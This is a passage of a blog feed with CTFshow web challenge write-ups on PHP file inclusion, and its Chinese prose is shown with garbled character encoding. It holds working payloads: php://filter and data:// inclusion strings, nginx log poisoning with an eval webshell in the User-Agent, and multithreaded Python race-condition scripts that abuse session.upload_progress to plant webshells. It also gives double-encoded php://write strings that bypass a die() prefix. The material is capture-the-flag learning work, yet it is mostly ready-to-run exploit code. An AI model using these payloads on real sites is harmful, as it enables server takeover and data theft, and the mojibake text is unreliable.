å°±èƒ½å¾—åˆ° <code>session</code>ç›¸å…³ä¿¡æ¯ï¼Œä»è€ŒåŒ…å« <code>session</code>ã€‚</p><p>payload1: <code>?..CTFSHOW..=phpinfo</code></p><p>å¯ä»¥çœ‹åˆ° <code>session.use_strict_mode</code> ä¸º Offï¼Œè¯´æ˜å¯ä»¥è‡ªå®šä¹‰ <code>session_id</code>ï¼Œæ§åˆ¶ <code>session</code> æ–‡ä»¶åï¼Œ <code>session.save_path</code> ä¸ºç©ºï¼Œç¡®å®šæ–‡ä»¶åŒ…å«è·¯å¾„ <code>/tmp/sess_&#123;session_id&#125;</code>ã€‚æ”¹ä¸€ä¸‹ç¥–ä¼ è„šæœ¬å†™ shellã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl <span class="token operator">=</span> <span class="token string">'http://fa7db7de-329e-44cf-8270-bcd8d7f96368.challenge.ctf.show:8080/?isVIP=1'</span>event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'aaaaaa&lt;?php file_put_contents("/var/www/html/s.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=="));?>'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>        _ <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'down'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'verysafe.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ctf"</span><span class="token punctuation">:</span> <span class="token string">"/tmp/sess_down"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'aaaaaa'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'retry'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>[PHPæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆåˆ©ç”¨phpinfoï¼‰](<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub&#x2F;php&#x2F;inclusion&#x2F;README.zh-cn.md at master Â· vulhub&#x2F;vulhub (github.com)</a>)</p><p>è¿™ç¯‡è¯¦ç»†è®²è§£äº†æ¼æ´çš„åˆ©ç”¨ï¼Œä¹‹å‰çš„æ¡ä»¶ç«äº‰å°±æ˜¯è¿™æ ·</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> phpç‰¹æ€§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-include</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-include/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-include/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä¸»è¦è€ƒå¯Ÿæ˜¯phpä¼ªåè®®ï¼Œä¹‹å‰Rceé‡Œä¹Ÿæœ‰æè¿‡ï¼Œè¿™é‡Œæ”¾å‡ ä¸ªå¸¸ç”¨Payload</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p></blockquote><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)</p></blockquote><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php  </p></blockquote><blockquote><p>php:&#x2F;&#x2F;input<br>POST cmd</p></blockquote><h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>ç­¾åˆ°</p><p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>å°†phpè¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘data</p><p>Payload:</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></blockquote><h4 id="web80-nginxæ—¥å¿—æ³¨å…¥"><a href="#web80-nginxæ—¥å¿—æ³¨å…¥" class="headerlink" title="web80(nginxæ—¥å¿—æ³¨å…¥)"></a>web80(nginxæ—¥å¿—æ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>dataä¹Ÿè¢«banäº†</p><p>ä½¿ç”¨nginxæ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œåœ¨User-Agentå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½¿ç”¨èšå‰‘è¿æ¥<a href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p><p>Payload:</p><blockquote><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>User-Agent: <?php @eval($_POST['attack']);?></p></blockquote><p>çœ‹é¢˜è§£ä¹Ÿå¯ä»¥å¤§å°å†™ç»•è¿‡ç”¨PHP:&#x2F;&#x2F;input</p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>å¤šè¿‡æ»¤äº†å†’å·ï¼Œæ‰€ä»¥ä¾æ—§å¯ä»¥nginxæ—¥å¿—æ³¨å…¥</p><h4 id="web82-åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«"><a href="#web82-åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«" class="headerlink" title="web82(åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«)"></a>web82(åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«)</h4><p><a href="https://www.freebuf.com/vuls/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœsession.auto_start&#x3D;On ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ä½†sessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º0ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID&#x3D;TGAOï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š&#x2F;tmp&#x2F;sess_TGAOâ€ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œã€‚</p><p>ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œé»˜è®¤é…ç½®session.upload_progress.cleanup &#x3D; onå¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œ</p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶å†…å®¹æ¸…ç©ºå‰è¿›è¡ŒåŒ…å«åˆ©ç”¨ã€‚</p><p><strong>sessionæ–‡ä»¶é»˜è®¤å­˜å‚¨è·¯å¾„</strong></p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p><strong>æ–¹æ³•ä¸€:</strong></p><p>å…ˆä»¥POSTçš„å½¢å¼å‘åŒ…ï¼Œä¸Šä¼ çš„æ–‡ä»¶éšæ„,ä¸‹é¢æ˜¯æ„é€ çš„ä¸Šä¼ è¡¨å•</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>ä½¿ç”¨burpè¿›è¡Œçˆ†ç ´ï¼ˆä¸¤ä¸ªè¦åŒæ—¶çˆ†ç ´ï¼‰</p><p><img src="web82.png" loading="lazy"></p><p><img src="web82_2.png" loading="lazy"></p><p>æœ€åç«äº‰å¾—åˆ°flag</p><p><strong>æ–¹æ³•äºŒ</strong>:</p><p>å¯ä»¥åˆ©ç”¨è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'Qftm'</span>url <span class="token operator">=</span> <span class="token string">'https://2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></code></pre><h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>æ¡ä»¶ç«äº‰åŒä¸Š</p><h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>æ·»åŠ äº†å¦‚ä¸‹ä»£ç </p><p>system(â€œrm -rf &#x2F;tmp&#x2F;*â€);</p><p>&#x2F;&#x2F; åœ¨ rm -rf &#x2F;tmp&#x2F;* æ‰§è¡Œä¹‹åç«‹åˆ»æœ‰æ–°çš„è¯·æ±‚åˆ›å»ºäº† sess_shell æ–‡ä»¶ æ¡ä»¶ç«äº‰ä¾ç„¶æœ‰æ•ˆ</p><h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>æ·»åŠ äº†ä¸€ä¸ªå†…å®¹è¯†åˆ«ï¼Œå¦‚æœæœ‰<code>&lt;</code>å°±dieï¼Œä¾æ—§å¯ä»¥ç«äº‰ã€‚</p><h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)è¡¨ç¤ºå½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚set_include_pathå‡½æ•°,æ˜¯ç”¨æ¥è®¾ç½®includeçš„è·¯å¾„çš„ï¼Œå°±æ˜¯include()å¯ä»¥ä¸æä¾›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„äº†ã€‚<br>includeæ–‡ä»¶æ—¶,å½“åŒ…å«è·¯å¾„æ—¢ä¸æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œä¹Ÿä¸æ˜¯ç»å¯¹è·¯å¾„æ—¶(å¦‚:include(â€œtest.phpâ€))ï¼Œä¼šå…ˆæŸ¥æ‰¾include_pathæ‰€è®¾ç½®çš„ç›®å½•ã€‚<br>è„šæœ¬é‡Œç”¨çš„æ˜¯å®Œæ•´è·¯å¾„ï¼Œä¸å½±å“ç«äº‰ã€‚</p><h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET['file']))&#123;    $file = $_GET['file'];    $content = $_POST['content'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);    file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å¤§ä½¬åˆ«ç§€äº†'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content);&#125;</code></pre><p>file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">PHP file_put_contents() å‡½æ•°</a></p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ447wWhSwi2iD&alichlgref=https://xz.aliyun.com/t/8163#toc-3">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</a></p><p>å‚è€ƒå¤§ä½¬æ–‡ç« ï¼Œå¯ä»¥ä½¿ç”¨base64æˆ–è€…rot13æ¥è¿›è¡Œå¯¹å‰é¢ä»£ç è¿›è¡Œæ‚ç³…</p><p>é¦–å…ˆæ„é€ $fileï¼Œå› ä¸ºè¦å¯¹fileè¿›è¡Œä¸€æ¬¡urlè§£ç æ‰€ä»¥æˆ‘ä»¬å¯¹payloadè¿›è¡Œä¸¤æ¬¡urlç¼–ç </p><p>æ™šä¸Šå¤§å¤šå·¥å…·æ˜¯å¯¹è‹±æ–‡å­—ç¬¦ä¸è¿›è¡Œurlç¼–ç çš„ï¼Œæ‰€ä»¥è¿™é‡Œç»™å‡ºè„šæœ¬æ–¹ä¾¿è¿›è¡Œurlencode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">def</span> <span class="token function">encode_char</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># æŒ‡å®šå­—ç¬¦é›†ï¼Œè½¬æ¢ä¸ºASCIIç åï¼Œå†è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå¹¶æ·»åŠ %</span>    special_chars <span class="token operator">=</span> <span class="token string">"!#$&amp;'()*+,/:;=?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>    <span class="token keyword">if</span> char <span class="token keyword">in</span> special_chars<span class="token punctuation">:</span>        <span class="token comment"># è½¬æ¢ä¸ºASCIIç ï¼Œç„¶åè½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå¹¶æ·»åŠ %</span>        <span class="token keyword">return</span> <span class="token string">'%&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># å¯¹å…¶ä»–å­—ç¬¦è¿›è¡ŒURLç¼–ç </span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># å¯¹å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦è¿›è¡Œç¼–ç </span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>encode_char<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> input_string<span class="token punctuation">)</span>input_string <span class="token operator">=</span> <span class="token string">"Test"</span>encoded_string <span class="token operator">=</span> url_encode<span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded_string<span class="token punctuation">)</span></code></pre><blockquote><p>php:&#x2F;&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;hsad.php</p><p>ä¸¤æ¬¡ç¼–ç åå¾—åˆ°</p><p>file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%38%25%37%33%25%36%31%25%36%34%25%32%65%25%37%30%25%36%38%25%37%30</p></blockquote><p>ç„¶åè¿›è¡ŒPost content</p><p>base64å¯ä»¥ç»•è¿‡dieå‡½æ•°ã€‚å› ä¸ºbase64ç¼–ç èŒƒå›´æ˜¯ <code>0 ï½ 9,a ï½ z,A ï½ Z,+,/ ï¼Œ</code>æ‰€ä»¥é™¤äº†è¿™äº›å­—ç¬¦ï¼Œå…¶ä»–å­—ç¬¦éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚</p><p>base64è¿‡æ»¤ä¹‹åå°±åªæœ‰(phpdie)6ä¸ªå­—ç¬¦äº†ï¼Œbase64è¦æ±‚æŠŠæ¯ä¸‰ä¸ª8Bitçš„å­—èŠ‚è½¬æ¢ä¸ºå››ä¸ª6Bitçš„å­—èŠ‚ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿè¦å‡‘å¤Ÿå››ä¸ªå­—èŠ‚çš„å€æ•°ï¼Œé¿å…base64è§£ç å‡ºé—®é¢˜ï¼Œè¿™é‡ŒåŠ ä¸Šä¸¤ä¸ªå­—ç¬¦å³å¯ã€‚</p><blockquote><p>â€‹                    <?php system("tac fl0g.php");?></p><p>content&#x3D;aaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p></blockquote><h4 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h4><p>å‘ç°è¿‡æ»¤çš„è¿˜æ˜¯æ¯”è¾ƒå¤šï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ : 